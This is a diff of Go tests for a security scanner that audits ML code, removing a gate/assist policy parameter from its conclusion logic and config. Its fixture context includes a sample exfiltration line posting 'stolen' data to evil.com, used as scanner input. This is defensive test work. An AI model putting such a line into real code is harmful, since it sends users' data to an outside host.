@@ -116,7 +116,7 @@ func TestComputeStatistics(t *testing.T) {
 
 func TestComputeConclusionClean(t *testing.T) {
 	stats := AuditStatistics{}
-	conclusion := ComputeConclusion(stats, nil, "gate")
+	conclusion := ComputeConclusion(stats, nil)
 	if !conclusion.Passed {
 		t.Fatal("clean code should pass")
 	}
@@ -127,7 +127,7 @@ func TestComputeConclusionClean(t *testing.T) {
 
 func TestComputeConclusionCritical(t *testing.T) {
 	stats := AuditStatistics{High: 1, Low: 1}
-	conclusion := ComputeConclusion(stats, nil, "gate")
+	conclusion := ComputeConclusion(stats, nil)
 	if conclusion.Passed {
 		t.Fatal("malicious code should not pass")
 	}
@@ -139,7 +139,7 @@ func TestComputeConclusionCritical(t *testing.T) {
 func TestComputeConclusionGatePolicyDowngrade(t *testing.T) {
 	// HIGH findings exist but all judged BENIGN by LLM -> categorized as Low
 	stats := AuditStatistics{Low: 2}
-	conclusion := ComputeConclusion(stats, nil, "gate")
+	conclusion := ComputeConclusion(stats, nil)
 	if !conclusion.Passed {
 		t.Fatal("gate mode should pass when all HIGH are BENIGN")
 	}
@@ -148,32 +148,9 @@ func TestComputeConclusionGatePolicyDowngrade(t *testing.T) {
 	}
 }
 
-func TestComputeConclusionAssistPolicy(t *testing.T) {
-	// High findings block in assist mode
-	stats := AuditStatistics{High: 1}
-	conclusion := ComputeConclusion(stats, nil, "assist")
-	if conclusion.Passed {
-		t.Fatal("assist mode should not pass with High findings")
-	}
-	if conclusion.RiskLevel != "CRITICAL" {
-		t.Fatalf("risk_level = %s, want CRITICAL", conclusion.RiskLevel)
-	}
-}
-
-func TestComputeConclusionAssistStaticOnlyBlocks(t *testing.T) {
-	stats := AuditStatistics{High: 1}
-	conclusion := ComputeConclusion(stats, nil, "assist")
-	if conclusion.Passed {
-		t.Fatal("assist mode should not pass with unresolved HIGH findings")
-	}
-	if conclusion.RiskLevel != "CRITICAL" {
-		t.Fatalf("risk_level = %s, want CRITICAL", conclusion.RiskLevel)
-	}
-}
-
 func TestComputeConclusionGateStaticOnlyBlocks(t *testing.T) {
 	stats := AuditStatistics{High: 1, Medium: 1}
-	conclusion := ComputeConclusion(stats, nil, "gate")
+	conclusion := ComputeConclusion(stats, nil)
 	if conclusion.Passed {
 		t.Fatal("gate mode should block static findings when no LLM verdicts are present")
 	}
@@ -258,7 +235,7 @@ func TestAssembleAuditReport(t *testing.T) {
 		},
 	}
 	lineCounts := map[string]int{"/a/train.py": 50}
-	cfg := LLMConfig{Model: "qwen2.5-coder:0.5b", Enabled: true, Policy: "gate"}
+	cfg := LLMConfig{Model: "qwen2.5-coder:0.5b", Enabled: true}
 
 	audit := AssembleAuditReport("/a", scanReport, fileReports, lineCounts, cfg, 2*time.Second)
 
@@ -299,7 +276,7 @@ func TestAssembleAuditReport_SummaryHonestyAndFailClosed(t *testing.T) {
 			{File: "test_run.py", Line: 1, RuleID: "EMB_003", Severity: SeverityMedium, LLMVerdict: "UNCERTAIN"},
 		},
 	}
-	cfgFailClosed := LLMConfig{Model: "qwen2.5-coder:3b", Enabled: true, Policy: "assist", FailClosed: true}
+	cfgFailClosed := LLMConfig{Model: "qwen2.5-coder:3b", Enabled: true, FailClosed: true}
 	auditDegraded := AssembleAuditReport("/test", scanReportDegraded, nil, map[string]int{"test_run.py": 10}, cfgFailClosed, 500*time.Millisecond)
 
 	if auditDegraded.Conclusion.Passed {
@@ -324,7 +301,7 @@ func TestAssembleAuditReport_SummaryHonestyAndFailClosed(t *testing.T) {
 			{File: "test_run.py", Line: 1, RuleID: "EMB_003", Severity: SeverityMedium, LLMVerdict: "BENIGN"},
 		},
 	}
-	cfgHealthy := LLMConfig{Model: "qwen2.5-coder:3b", Enabled: true, Policy: "assist", FailClosed: true}
+	cfgHealthy := LLMConfig{Model: "qwen2.5-coder:3b", Enabled: true, FailClosed: true}
 	auditBenign := AssembleAuditReport("/test", scanReportBenign, nil, map[string]int{"test_run.py": 10}, cfgHealthy, 500*time.Millisecond)
 
 	if !auditBenign.Conclusion.Passed {
@@ -420,7 +397,7 @@ def steal_data(data):
 		},
 	}
 
-	cfg := LLMConfig{Enabled: true, Model: "test-model", Policy: "gate", MaxFindings: 10}
+	cfg := LLMConfig{Enabled: true, Model: "test-model", MaxFindings: 10}
 	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), AuditConfig{LLM: cfg}, mock)
 	if err != nil {
 		t.Fatal(err)
@@ -498,7 +475,7 @@ requests.post("http://evil.com", data="stolen")
 		},
 	}
 
-	cfg := LLMConfig{Enabled: true, Model: "test-model", Policy: "gate", MaxFindings: 10}
+	cfg := LLMConfig{Enabled: true, Model: "test-model", MaxFindings: 10}
 	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), AuditConfig{LLM: cfg}, mock)
 	if err != nil {
 		t.Fatal(err)
@@ -606,7 +583,7 @@ requests.post("http://monitor.local/metrics", json={"acc": 0.95})
 		},
 	}
 
-	cfg := LLMConfig{Enabled: true, Model: "qwen2.5-coder:0.5b", Policy: "gate", MaxFindings: 10}
+	cfg := LLMConfig{Enabled: true, Model: "qwen2.5-coder:0.5b", MaxFindings: 10}
 	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), AuditConfig{LLM: cfg}, mock)
 	if err != nil {
 		t.Fatal(err)
@@ -768,7 +745,7 @@ func TestRetinaDKDScenarioConclusionIsLow(t *testing.T) {
 		benignFindings[i].LLMRisk = "LOW"
 	}
 	statsA := ComputeStatistics(benignFindings)
-	conclusionA := ComputeConclusion(statsA, nil, "assist")
+	conclusionA := ComputeConclusion(statsA, nil)
 	if conclusionA.RiskLevel != "LOW" {
 		t.Errorf("Scenario A (BENIGN) RiskLevel = %s, want LOW", conclusionA.RiskLevel)
 	}
@@ -783,7 +760,7 @@ func TestRetinaDKDScenarioConclusionIsLow(t *testing.T) {
 		uncertainFindings[i].LLMVerdict = "UNCERTAIN"
 	}
 	statsB := ComputeStatistics(uncertainFindings)
-	conclusionB := ComputeConclusion(statsB, nil, "assist")
+	conclusionB := ComputeConclusion(statsB, nil)
 	if conclusionB.RiskLevel != "LOW" {
 		t.Errorf("Scenario B (UNCERTAIN fallback) RiskLevel = %s, want LOW", conclusionB.RiskLevel)
 	}
@@ -861,7 +838,7 @@ func TestFileReportOrderIsTotalAndRunIndependent(t *testing.T) {
 		in := newTied()
 		shuffled := []FileReport{in[order[0]], in[order[1]], in[order[2]]}
 
-		audit := AssembleAuditReport("/w", scanReport, shuffled, nil, LLMConfig{Policy: "assist"}, 0)
+		audit := AssembleAuditReport("/w", scanReport, shuffled, nil, LLMConfig{}, 0)
 
 		if got := paths(audit.FileReports); got != want {
 			t.Errorf("input order %v produced file_reports %s; want %s — tied reports must be ordered by "+
@@ -876,11 +853,13 @@ func TestFileReportOrderIsTotalAndRunIndependent(t *testing.T) {
 // that recomputation so that ProvesCleanScan reads it.
 //
 // The fixture is built so the last assertion can fail. Both findings are MEDIUM,
-// which under the default `assist` policy does not block, so the report passes
-// before the merge and would still pass after it if the summary arrived too late
-// - the only thing that can withdraw the pass is BoundedExecutable, and only if
-// the summary was there when recomputeReportPassed ran. A fixture with a HIGH in
-// it would hold this assertion whichever order the merge used, and would pin
+// which the report-level recomputation does not block: recomputeReportPassed
+// counts only static HIGH (and an incomplete scan), leaving the conclusion's own
+// MEDIUM check as the thing that refuses the import. So the report passes before
+// the merge and would still pass after it if the summary arrived too late - the
+// only thing that can withdraw the pass is BoundedExecutable, and only if the
+// summary was there when recomputeReportPassed ran. A fixture with a HIGH in it
+// would hold this assertion whichever order the merge used, and would pin
 // nothing.
 func TestMergeBinaryFindingsAppendsAndRecomputes(t *testing.T) {
 	report := &Report{
@@ -892,7 +871,7 @@ func TestMergeBinaryFindingsAppendsAndRecomputes(t *testing.T) {
 	}
 	recomputeReportPassed(report, false)
 	if !report.Passed {
-		t.Fatal("fixture is wrong: a MEDIUM-only report passes under assist")
+		t.Fatal("fixture is wrong: a MEDIUM-only report passes the report-level recomputation")
 	}
 	if report.MediumCount != 1 {
 		t.Fatalf("fixture is wrong: MediumCount = %d, want 1", report.MediumCount)
@@ -1017,9 +996,9 @@ func TestMergeBinaryFindingsDropsTextFindingsAcrossPathSpellings(t *testing.T) {
 // because the pass assertion below has to survive the merge: what this test
 // pins is the length of the joined list, and a HIGH binary finding would
 // withdraw the pass on its own, making that assertion a statement about
-// severity instead of about capping. MEDIUM does not block under `assist`, so
-// the merge's own recomputation leaves the report passing and a future change
-// that dropped a joined finding shows up as a shorter list.
+// severity instead of about capping. MEDIUM does not block the report-level
+// recomputation, so the merge's own recomputation leaves the report passing and
+// a future change that dropped a joined finding shows up as a shorter list.
 func TestMergeBinaryFindingsKeepsBothChannelsFindings(t *testing.T) {
 	report := &Report{ScanComplete: true, FilesCount: 3}
 	for i := 0; i < 3; i++ {
